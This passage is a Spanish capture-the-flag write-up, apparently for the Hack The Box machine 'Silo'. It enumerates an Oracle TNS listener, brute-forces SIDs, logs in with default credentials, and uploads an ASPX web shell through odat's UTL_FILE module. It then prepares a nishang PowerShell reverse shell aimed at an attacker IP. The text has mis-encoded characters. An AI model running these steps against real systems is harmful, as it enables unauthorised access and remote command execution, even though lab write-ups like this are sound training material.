seconds‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄEntonces tenemos:       Puerto   Descripci√≥n         80   HTTP       135   RPC       139   SMB       445   SMB       1521   Oracle TNS       5985   winrm       47001   winrm       49152, 49153, 49154, 49155, 49159, 49160, 49161, 49162   Desconocidos   Ahora hagamos un escaneo de scripts y versiones para tener info m√°s especifica de cada puerto: ‚ù≠ extractPorts initScan ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ    ‚îÇ File: extractPorts. tmp‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  1  ‚îÇ  2  ‚îÇ [*] Extracting information. . .  3  ‚îÇ  4  ‚îÇ   [*] IP Address: 10. 10. 10. 82  5  ‚îÇ   [*] Open ports: 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162  6  ‚îÇ  7  ‚îÇ [*] Ports copied to clipboard  8  ‚îÇ ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ù≠ nmap -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -sC -sV 10. 10. 10. 82 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ    ‚îÇ File: portScan‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ  1  ‚îÇ # Nmap 7. 80 scan initiated Fri Apr 16 25:25:25 2021 as: nmap -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -sC -sV -oN portScan 10. 10. 10. 82  2  ‚îÇ Nmap scan report for 10. 10. 10. 82  3  ‚îÇ Host is up (0. 34s latency).  4  ‚îÇ  5  ‚îÇ PORT   STATE SERVICE   VERSION  6  ‚îÇ 80/tcp  open http     Microsoft IIS httpd 8. 5  7  ‚îÇ | http-methods:  8  ‚îÇ |_ Potentially risky methods: TRACE  9  ‚îÇ |_http-server-header: Microsoft-IIS/8. 5 10  ‚îÇ |_http-title: IIS Windows Server 11  ‚îÇ 135/tcp  open msrpc    Microsoft Windows RPC 12  ‚îÇ 139/tcp  open netbios-ssn Microsoft Windows netbios-ssn 13  ‚îÇ 445/tcp  open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 14  ‚îÇ 1521/tcp open oracle-tns  Oracle TNS listener 11. 2. 0. 2. 0 (unauthorized) 15  ‚îÇ 5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP) 16  ‚îÇ |_http-server-header: Microsoft-HTTPAPI/2. 0 17  ‚îÇ |_http-title: Not Found 18  ‚îÇ 47001/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP) 19  ‚îÇ |_http-server-header: Microsoft-HTTPAPI/2. 0 20  ‚îÇ |_http-title: Not Found 21  ‚îÇ 49152/tcp open msrpc    Microsoft Windows RPC 22  ‚îÇ 49153/tcp open msrpc    Microsoft Windows RPC 23  ‚îÇ 49154/tcp open msrpc    Microsoft Windows RPC 24  ‚îÇ 49155/tcp open msrpc    Microsoft Windows RPC 25  ‚îÇ 49159/tcp open oracle-tns  Oracle TNS listener (requires service name) 26  ‚îÇ 49160/tcp open msrpc    Microsoft Windows RPC 27  ‚îÇ 49161/tcp open msrpc    Microsoft Windows RPC 28  ‚îÇ 49162/tcp open msrpc    Microsoft Windows RPC 29  ‚îÇ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows 30  ‚îÇ  31  ‚îÇ Host script results: 32  ‚îÇ |_clock-skew: mean: 7m06s, deviation: 0s, median: 7m05s 33  ‚îÇ |_smb-os-discovery: ERROR: Script execution failed (use -d to debug) 34  ‚îÇ | smb-security-mode:  35  ‚îÇ |  account_used: guest 36  ‚îÇ |  authentication_level: user 37  ‚îÇ |  challenge_response: supported 38  ‚îÇ |_ message_signing: supported 39  ‚îÇ | smb2-security-mode:  40  ‚îÇ |  2. 02:  41  ‚îÇ |_  Message signing enabled but not required 42  ‚îÇ | smb2-time:  43  ‚îÇ |  date: 2021-04-17T01:19:28 44  ‚îÇ |_ start_date: 2021-04-17T00:48:33 45  ‚îÇ  46  ‚îÇ Service detection performed. Please report any incorrect results at https://nmap. org/submit/ .  47  ‚îÇ # Nmap done at Fri Apr 16 25:25:25 2021 -- 1 IP address (1 host up) scanned in 147. 56 seconds‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄObtenemos (varias cositas que veremos despues) por ahora:       Puerto   Servicio   Versi√≥n         135   HTTP   Microsoft IIS httpd 8. 5       135   RPC   Microsoft Windows RPC       139   SMB   Microsoft Windows netbios-ssn       445   SMB   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds       1521   oracle-tns   Oracle TNS listener 11. 2. 0. 2. 0 (unauthorized)       5985   winrm   Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)       47001   winrm   Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)       49152   msrpc   Microsoft Windows RPC       49153   msrpc   Microsoft Windows RPC       49154   msrpc   Microsoft Windows RPC       49155   msrpc   Microsoft Windows RPC       49159   oracle-tns   Oracle TNS listener (requires service name)       49160   msrpc   Microsoft Windows RPC       49161   msrpc   Microsoft Windows RPC       49162   msrpc   Microsoft Windows RPC   Bueeeeno, parecen muchos puertos, pero realmente son pocos, D√©mosle a ver! ‚Ä¶ Puerto 80 ‚åñ: Empezaremos revisando el servicio web. Si vamos al navegador y colocamos la IP, nos direcciona a: La pantalla por default del servidor IIS (Internet Information Services) como bien dice en la imagen :P Haciendo fuzzing tampoco encontramos nada, as√≠ que por ahora no tenemos nada con respecto al servidor web. ‚Ä¶ Puerto 135 (RPC) ‚åñ:  MSRPC (Microsoft Remote Procedure Call): Nos permite ejecutar procesos remotamente, pueden ser en otros sistemas o recursos compartidos en la red. Apoy√°ndonos de la herramienta rpcclient podemos intentar entrar a los recursos con credenciales nulas: ‚ù≠ rpcclient -U '' 10. 10. 10. 82Enter WORKGROUP\'s password: Cannot connect to server.  Error was NT_STATUS_LOGON_FAILUREPero nada :( Sigamos. ‚Ä¶ Puerto 139-445 (SMB) ‚åñ:  SAMBA, en terminos generales nos permite compartir archivos (y otras cositas) entre usuarios de una misma red‚Ä¶  M√°s info sobre los puertos 139 y 445 de SAMBA. Veamos con que sistema estamos tratando f√°cilmente mediante crackmapexec: ‚ù≠ crackmapexec smb 10. 10. 10. 82SMB     10. 10. 10. 82   445  SILO       [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True) Windows Server 2012 :OProbemos ahora con smbclient y smbmap, as√≠ validamos los recursos disponibles a los que podamos acceder (si es que podemos sin credenciales): ‚ù≠ smbclient -U '' -L //10. 10. 10. 82Enter WORKGROUP\'s password: session setup failed: NT_STATUS_LOGON_FAILURE‚ù≠ smbmap -H 10. 10. 10. 82 -u 'null'[!] Authentication error on 10. 10. 10. 82Nada, as√≠ que sigamos viendo los puertos disponibles. ‚Ä¶ Puerto 1521 (Oracle TNS) ‚åñ:  Oracle DB es una base de datos relacional.  Oracle Database.  Oracle TNS (Transparent Network Substrate) Listener seg√∫n unaaldia. hispasec, es el encargado de gestionar el establecimiento de las comunicaciones entre las distintas instancias de la base de datos, sus servicios y el cliente. Perfectoo, no hab√≠a tratado antes con este servicio, as√≠ que ta interesante. Si recordamos nuestro escaneo con nmap vimos una versi√≥n para Oracle TNS listener. Versi√≥n 11. 2. 0. 2. 0, buscando en internet oracle tns listener 11. 2. 0. 2. 0 exploit llegamos a esta guia para probar vulnerabilidades en el servicio:  Guia de pentesting sobre el servicio Oracle TNS listener. Seg√∫n la gu√≠a citada, vemos muchas maneras de empezar a jugar con este servicio, podemos volver a validar la versi√≥n mediante la herramienta tnscmd10g: ‚ù≠ tnscmd10g version -p 1521 -h 10. 10. 10. 82sending (CONNECT_DATA=(COMMAND=version)) to 10. 10. 10. 82:1521writing 90 bytesreading. e. . . . . .  . . Y(DESCRIPTION=(TMP=)(VSNNUM=186647040)(ERR=1189)(ERROR_STACK=(ERROR=(CODE=1189)(EMFI=4))))Vemos la versi√≥n en formato decimal, jugando con bc (para conversi√≥n) y echo (como emitidor de valores) podemos entender la versi√≥n: # Le indicamos que nos muestre el resultado en hexadecimal:‚ù≠ echo  obase=16; 186647040  | bcB200200# Le indicamos que reciba un valor en hexadecimal y que sea convertido a valor decimal:‚ù≠ echo  obase=10; ibase=16; B  | bc11Como resultado tendr√≠amos: 11. 2. 0. 2. 0, as√≠ que perfecto, vemos un error (creo) y tambi√©n (creo :P) que nos responde el servicio.  Converto dec to hex - bash.  Convert hex to dec - bash. ‚Ä¶ Explotaci√≥n #: Siguiendo la gu√≠a, podemos enumerar SIDs, que son las instancias que nos permiten conectarnos a las bases de datos del servicio. Lo que me da a entender que si no tenemos alg√∫n SID no podremos entrar o comunicarnos con ninguna DB. Leyendo encontramos que las instancias tendr√°n el mismo nombre que las bases de datos peeeero sin el dominio (jmm).  ¬øQu√© significa SID en Oracle?.  The SID (Service Identifier) is essentially the database name. Pentesting 1521. Bien, podemos usar varias herramientas para hacer un brute force e intentar descubrir SIDs disponibles, usaremos hydra con un wordlist (sids-oracle. txt) que nos probee la propia gu√≠a ü•∞ : ‚ù≠ hydra -L sids-oracle. txt -s 1521 10. 10. 10. 82 oracle-sid[DATA] attacking oracle-sid://10. 10. 10. 82:1521/[1521][oracle-sid] host: 10. 10. 10. 82[1521][oracle-sid] host: 10. 10. 10. 82  login: CLRExtProc[1521][oracle-sid] host: 10. 10. 10. 82  login: PLSExtProc[1521][oracle-sid] host: 10. 10. 10. 82  login: XE1 of 1 target successfully completed, 4 valid passwords foundBien, nos encuentra presuntamente 3 SIDs v√°lidos en el servicio, siguiendo la gu√≠a, ahora podr√≠amos conectarnos a ellos, pero claro, nos faltan credenciales para usar :P Podemos tambi√©n realizar fuerza bruta para encontrar usuarios y contrase√±as v√°lidas contra cada SID, esto lo podemos hacer con la herramienta odat. py que tiene muuuuuuuuuuuuchas opciones para jugar contra bases de datos Oracle. Ac√° estuve un buen rato intentando instalarla (por ciego), ya que odat necesita unas librer√≠as de Oracle y para instalarlas la misma gu√≠a nos a  [Oracle pentesting requirement installation](https://book. hacktricks. xyz/pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation)  donde despu√©s de instalar las cosillas obtenemos dos cosas importantes:  sqlplus, que nos servir√° para conectarnos a la base de datos desde la consola.  Que odat. py se ejecute sin problemas :) Si la guia inicial es confusa o cualquier cosa :P Les paso otra que encontre un poco m√°s detallada :) Entonces, si nos dirigimos a la Wiki de odat. py, vemos como hacer fuerza bruta para encontrar usuarios basados en los SID: Probando con cada uno, el √∫nico que nos da resultado es el SID -&gt; XE: ‚ù≠ python3 odat. py all -s 10. 10. 10. 82 -p 1521 -d XE[+] Checking if target 10. 10. 10. 82:1521 is well configured for a connection. . . [+] According to a test, the TNS listener 10. 10. 10. 82:1521 is well configured. Continue. . . [1] (10. 10. 10. 82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?[+] The target is vulnerable to a remote TNS poisoning[2] (10. 10. 10. 82:1521): Searching valid accounts on the XE SID. . . [+] Valid credentials found: scott/tiger. Continue. . . . . . Opa, vemos 2 cositas interesant√≠simas:  Nos detecta que el servicio es vulnerable a un CVE llamado CVE-2012-1675, ya veremos de que trata.  Encuentra credenciales v√°lidas: usuario:scott con contrase√±a:tigerAntes de profundizar en el CVE y ver si lo podemos explotar, veamos si las credenciales son v√°lidas, nos apoyamos de la utilidad que instalamos antes, sqlplus: ‚ù≠ . /sqlplus scott/tiger@10. 10. 10. 82/XE;SQL*Plus: Release 21. 0. 0. 0. 0 - Production on Mon Apr 19 25:25:25 2021Version 21. 1. 0. 0. 0Copyright (c) 1982, 2020, Oracle.  All rights reserved. ERROR:ORA-28002: the password will expire within 7 daysConnected to:Oracle Database 11g Express Edition Release 11. 2. 0. 2. 0 - 64bit ProductionSQL&gt; PerfecTOWOWowowowooooooooooooooooooo e. e tenemos credenciales validas contra el servicio y SID. En la guia nos indica que podemos probar si el usuario con el que entramos tiene permisos como administrador de la base de datos: ‚ù≠ . /sqlplus scott/tiger@10. 10. 10. 82/XE 'as sysdba';SQL*Plus: Release 21. 0. 0. 0. 0 - Production on Mon Apr 19 14:39:38 2021Version 21. 1. 0. 0. 0Copyright (c) 1982, 2020, Oracle.  All rights reserved. Connected to:Oracle Database 11g Express Edition Release 11. 2. 0. 2. 0 - 64bit ProductionSQL&gt; How to list users in the Oracle DB.  How to show all Oracle DB Privileges for a user. Opa, logramos entrar, asi que ahora si, veamos de que trata la vulnerabilidad a la que nos hacen referencia‚Ä¶ ‚Ä¶ Validando CVE-2012-1675: Podemos volver a validar si realmente es vulnerable con un script de nmap:  github. com/bongbongco/CVE-2012-1675 - Oracle TNS listener. nse (Tester vuln/not-vuln). ‚ù≠ wget https://raw. githubusercontent. com/bongbongco/CVE-2012-1675/master/oracle-tns-poison. nse‚ù≠ nmap -p 1521 --script=oracle-tns-poison 10. 10. 10. 82 -oN tnsPoisonTester. . . Nmap scan report for 10. 10. 10. 82PORT   STATE SERVICE1521/tcp open oracle|_oracle-tns-poison: Host is vulnerable!Lito, tenemos claro que es vulnerable, ¬øpero a qu√©? Bueno, leyendo sobre la vulnerabilidad nos indica que como atacantes podemos ejecutar comandos de base de datos por medio de una instalaci√≥n de una base de datos/instancia/SID que ya exista, esto para efectuar un Man-in-the-middle para robar las conexiones que pasan por la base de datos.  Reporte oficial y completo de la vulnerabilidad.  Oracle TNS Listener Envenamiento Remoto.  Vulnerabilidad cr√≠tica Oracle - CVE-2012-1675. ‚Ä¶ Despu√©s de un rato jugando con la herramienta odat. py y su apartado llamado tnspoison que est√° relacionado con este CVE, no logramos hacerlo funcionar, lo ejecutamos, abrimos Wireshark, vemos los paquetes que pasan pero nada m√°s. ‚ù≠ python3 odat. py tnspoison -s 10. 10. 10. 82 -d XE --poison[1] (10. 10. 10. 82:1521): Local proxy on port 1522 and TNS poisoning attack to 10. 10. 10. 82:1521 are starting. Waiting for connections. . . Al darle a la ayuda propia del script vemos la opci√≥n --sysdba, la que permite ejecutar todos los procesos como administradores de la base de datos. Como vimos que anteriormente nos dej√≥ entrar mediante sqlplus como sysdba, podr√≠amos ‚Äúvolver a empezar‚Äù pero ahora con ese par√°metro de m√°s, quiz√°s obtengamos nueva info. El primero m√≥dulo (como lo dicen ellos) a usar con odat. py seria all, para validar que est√°n disponibles y empezar a jugar con la [Wiki](https://github. com/quentinhardy/odat/wiki/tnspoison) entre cada uno. ‚ù≠ python3 odat. py all -s 10. 10. 10. 82 -p 1521 -d XE -U scott -P tiger --sysdba[+] Checking if target 10. 10. 10. 82:1521 is well configured for a connection. . . [+] According to a test, the TNS listener 10. 10. 10. 82:1521 is well configured. Continue. . . [1] (10. 10. 10. 82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?[+] The target is vulnerable to a remote TNS poisoning[2] (10. 10. 10. 82:1521): Testing all authenticated modules on sid:XE with the scott/tiger account [2. 1] UTL_HTTP library ?[+] OK[2. 2] HTTPURITYPE library ?[+] OK[2. 3] UTL_FILE library ?[+] OK[2. 4] JAVA library ?[-] KO[2. 5] DBMSADVISOR library ?[+] OK[2. 6] DBMSSCHEDULER library ?[+] OK[2. 7] CTXSYS library ?[+] OK[2. 8] Hashed Oracle passwords ?[+] OK[2. 9] Hashed Oracle passwords from history?[+] OK[2. 10] DBMS_XSLPROCESSOR library ?[+] OK[2. 11] External table to read files ?[+] OK[2. 12] External table to execute system commands ?[+] OK[2. 13] Oradbg ?[-] KO[2. 14] DBMS_LOB to read files ?[+] OK[2. 15] SMB authentication capture ?[+] Perhaps (try with --capture to be sure)[2. 16] Gain elevated access (privilege escalation)?[2. 16. 1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?[+] OK[2. 16. 2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?[-] KO. . . Vemos muchos [+] (sin --sysdba son todo [-]). Asi que bien, pues ahora seria irnos a la Wiki e ir recorriendo cada [+] y ver si nos es de utilidad‚Ä¶ [2. 3] UTL_FILE library ?[+] OKEn el segundo [+] tenemos la libreria UTL_FILE, en la Wiki tenemos: Que nos permite subir, descargar y borrar archivos relacionados con el sistema :o Prob√©moslo, subamos un archivo llamado hola. txt: ‚ù≠ cat hola. txt que lo ke mi perritoEjecutamos sin el argumento --sysdba, le indicamos que vamos a subir un archivo a la ruta C:\Windows\System32\Temp llamado hola. txt que lo tenemos en nuestra m√°quina con el nombre hola. txt: ‚ù≠ python3 odat. py utlfile -s 10. 10. 10. 82 -p 1521 -d XE -U scott -P tiger --putFile 'C:\Windows\System32\Temp' hola. txt hola. txt[1] (10. 10. 10. 82:1521): Put the hola. txt local file in the C:\Windows\System32\Temp folder like hola. txt on the 10. 10. 10. 82 server[-] Impossible to put the hola. txt file: `ORA-01031: insufficient privileges`Ahora como sysdba: ‚ù≠ python3 odat. py utlfile -s 10. 10. 10. 82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile 'C:\Windows\System32\Temp' hola. txt hola. txt[1] (10. 10. 10. 82:1521): Put the hola. txt local file in the C:\Windows\System32\Temp folder like hola. txt on the 10. 10. 10. 82 server[-] Impossible to put the hola. txt file: `ORA-29283: invalid file operation ORA-06512: at  SYS. UTL_FILE , line 536 ORA-29283: invalid file operation ORA-06512: at line 1`e. e Cambia el error, pero es un error, probemos otra ruta temporal: ‚ù≠ python3 odat. py utlfile -s 10. 10. 10. 82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile 'C:\Windows\Temp' hola. txt hola. txt[1] (10. 10. 10. 82:1521): Put the hola. txt local file in the C:\Windows\Temp folder like hola. txt on the 10. 10. 10. 82 server[+] The hola. txt file was created on the C:\Windows\Temp directory on the 10. 10. 10. 82 server like the hola. txt filePerfecto (o pues eso parece :P), se subio el archivo :) Sabiendo esto podemos intentar subir algo a la ruta en la que esta el servidor web, si buscamos la ruta por default en Windows tenemos: Probemos ahora con esa ruta y validemos despues en la web: ‚ù≠ python3 odat. py utlfile -s 10. 10. 10. 82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile 'C:\inetpub\wwwroot' hola. txt hola. txt[1] (10. 10. 10. 82:1521): Put the hola. txt local file in the C:\inetpub\wwwroot folder like hola. txt on the 10. 10. 10. 82 server[+] The hola. txt file was created on the C:\inetpub\wwwroot directory on the 10. 10. 10. 82 server like the hola. txt fileBien, la ruta existe, ahora validemosla: PERFECTOOOOOO, tenemos acceso a los archivos que subamos al servidor web‚Ä¶ ¬øQu√© se te ocurre? Pos s√≠, subamos una web Shell ‚Ä¶ Subiendo WebShell: Sabiendo que estamos ante un servidor web y que est√° siendo mantenido por Microsoft ASP. NET, hacemos una b√∫squeda r√°pida de que tipo de extensi√≥n permite ASP. NET y tenemos:  ASP. NET es un entorno para aplicaciones web desarrollado y comercializado por Microsoft. Los formularios web est√°n contenidos en archivos con una extensi√≥n ASPX. Listos, buscando en el repo de SecLists encontramos varias web-shells, subiremos cmd. aspx: ‚ù≠ ls -la /opt/SecLists/Web-Shells/FuzzDB/cmd. aspx    cmd. php     cmd-simple. php list. php    nc. exe     up. phpcmd. jsp     cmd. sh     list. jsp    list. sh     reverse. jsp   up. shEjecutamos: ‚ù≠ python3 odat. py utlfile -s 10. 10. 10. 82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile 'C:\inetpub\wwwroot' lawebshelltremenda. aspx cmd. aspx[1] (10. 10. 10. 82:1521): Put the cmd. aspx local file in the C:\inetpub\wwwroot folder like lawebshelltremenda. aspx on the 10. 10. 10. 82 server[+] The cmd. aspx file was created on the C:\inetpub\wwwroot directory on the 10. 10. 10. 82 server like the lawebshelltremenda. aspx fileValidamos: Listos, tenemos ejecuci√≥n remota de comandos :) Establezcamos una reverse Shell‚Ä¶ Nos ponemos en escucha por el puerto que queremos recibirla: ‚ù≠ nc -lvp 4433listening on [any] 4433 . . . Generaremos una PowerShell mediante el repo nishang que tiene muchas utilidades, entre ellas, shells: ‚ù≠ cp /opt/nishang/Shells/Invoke-PowerShellTcp. ps1 . ‚ù≠ mv Invoke-PowerShellTcp. ps1 Itcp. ps1Ahora modificaremos su contenido, tomaremos una cadena comentada y la moveremos al final del archivo sin comentarios, esto para que cuando hagamos la descarga del mismo mediante la web-shell lo interprete a la vez, por lo tanto leer√≠a los comandos para la reverse shell y se ejecutar√≠an de una vez, dos pasos en uno ;) Tomamos esta cadena del inicio: . . . PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192. 168. 254. 226 -Port 4444. . . 